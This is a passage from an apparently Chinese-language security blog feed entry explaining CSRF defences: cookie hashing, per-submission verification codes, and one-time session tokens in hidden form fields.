<p>这种防范方法的思想非常简单。既然 CSRF 只是伪造用户请求而不能拿到用户的 cookie<br>，那么只要对 Cookie 进行一次 hash 计算，然后在服务器端验证这个 hash 值就好了。<br>但是这种方式并非完美。由于用户的 Cookie 也可能由于网站的 XSS 漏洞被盗取，此时攻击者也可以轻易算出 Hash，所以综合来看这种简单的方法也存在一定的漏洞。</p>
</li>
<li><p>Authentication Code</p>
<p>这种方式的思想也十分简单，用户每次提交表单都需要填写一个验证码，不过这种方式易用性并不太好，加重了用户的麻烦。好在可以完全解决 CSRF 的问题。</p>
</li>
<li><p>One-Time Tokens(不同的表单包含一个不同的伪随机值)</p>
<p>一般通过 session token 来实现保护。当客户端请求页面时，服务器会生成一个随机数 Token，并且将 Token 放置到 session 当中，然后将 Token 发给客户端(一般通过构造 hidden 表单)。下次客户端提交请求时，Token 会随着表单一起提交到服务器端。接收到请求后，服务器端会对 Token 值进行验证，判断是否和 session 中的 Token 值相等，若相等，则可以证明请求有效，不是伪造的。由于攻击者服务器不能产生有效的 Token，直接对目标服务器进行请求势必不能通过验证，于是解决了 CSRF 的问题。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CVE</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
</search>
